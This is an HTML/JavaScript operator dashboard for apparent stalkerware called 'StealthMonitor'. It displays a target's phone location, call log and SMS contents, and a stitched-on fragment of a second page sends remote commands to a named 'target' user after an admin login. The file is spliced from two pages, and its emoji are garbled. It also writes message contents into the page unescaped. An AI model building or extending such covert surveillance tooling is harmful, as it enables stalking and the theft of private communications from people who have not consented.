<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <title>Dashboard - StealthMonitor</title>
  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
  <style>
    body { font-family: sans-serif; margin: 0; padding: 0; }
    #map { height: 300px; }
    table { width: 100%; border-collapse: collapse; margin-top: 1em; }
    th, td { border: 1px solid #ccc; padding: 8px; font-size: 14px; }
    th { background: #f0f0f0; }
  </style>
</head>
<body>
  <h2>Dashboard StealthMonitor</h2>
  <button onclick="logout()">Logout</button>
  <button onclick="loadData()">üîÑ Atualizar Dados</button>

  <h3>üó∫Ô∏è Localiza√ß√£o</h3>
  <div id="map"></div>

  <h3>üìû Chamadas</h3>
  <table id="callsTable">
    <thead>
      <tr><th>Nome</th><th>Telefone</th><th>Tipo</th><th>Dura√ß√£o</th><th>Timestamp</th></tr>
    </thead>
    <tbody></tbody>
  </table>

  <h3>‚úâÔ∏è SMS</h3>
  <table id="smsTable">
    <thead>
      <tr><th>De</th><th>Para</th><th>Conte√∫do</th><th>Timestamp</th></tr>
    </thead>
    <tbody></tbody>
  </table>

  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
  <script>
    const token = localStorage.getItem('token');
    if (!token) location.href = '/';

    const map = L.map('map').setView([0, 0], 2);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);

    function logout() {
      localStorage.removeItem('token');
      location.href = '/';
    }

    async function loadData() {
      try {
        const res = await fetch('/api/data', {
          headers: { Authorization: 'Bearer ' + token }
        });
        const data = await res.json();

        const last = data[data.length - 1];
        if (last?.location) {
          map.setView([last.location.lat, last.location.lng], 14);
          L.marker([last.location.lat, last.location.lng])
            .addTo(map)
            .bindPopup("√öltima Localiza√ß√£o")
            .openPopup();
        }

        const callsBody = document.querySelector('#callsTable tbody');
        callsBody.innerHTML = '';
        last.calls.forEach(call => {
          const row = `<tr>
            <td>${call.name}</td>
            <td>${call.number}</td>
            <td>${call.type}</td>
            <td>${call.duration}</td>
            <td>${new Date(call.timestamp).toLocaleString()}</td>
          </tr>`;
          callsBody.innerHTML += row;
        });

        const smsBody = document.querySelector('#smsTable tbody');
        smsBody.innerHTML = '';
        last.sms.forEach(msg => {
          const row = `<tr>
            <td>${msg.from}</td>
            <td>${msg.to}</td>
            <td>${msg.content}</td>
            <td>${new Date(msg.timestamp).toLocaleString()}</td>
          </tr>`;
          smsBody.innerHTML += row;
        });

      } catch (err) {
        alert("Erro ao carregar dados.");
        console.error(err);
      }
    }

    loadData();
  </script>
</body>
</html>
      status.textContent = 'Autenticando‚Ä¶';
      try {
        const res = await fetch('/api/auth/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username: user, password: pass })
        });
        const json = await res.json();
        if (!res.ok) throw new Error(json.error || res.status);
        adminToken = json.token;
        status.textContent = 'Autenticado com sucesso!';
      } catch (e) {
        status.textContent = 'Erro no login: ' + e.message;
      }
    };

    document.getElementById('btnSend').onclick = async () => {
      const target = document.getElementById('targetUser').value.trim();
      const status = document.getElementById('cmdStatus');
      if (!adminToken) {
        status.textContent = 'Fa√ßa login como admin primeiro.';
        return;
      }
      if (!target) {
        status.textContent = 'Informe o username alvo.';
        return;
      }
      status.textContent = 'Enviando comando‚Ä¶';
      try {
        const res = await fetch(`/api/command/${encodeURIComponent(target)}`, {
          method: 'POST',
          headers: {
            'Authorization': 'Bearer ' + adminToken
          }
        });
        const json = await res.json();
        if (!res.ok) throw new Error(json.error || res.status);
        status.textContent = 'Comando enviado: ' + JSON.stringify(json);
      } catch (e) {
        status.textContent = 'Erro ao enviar: ' + e.message;
      }
    };
  </script>
</body>
</html>
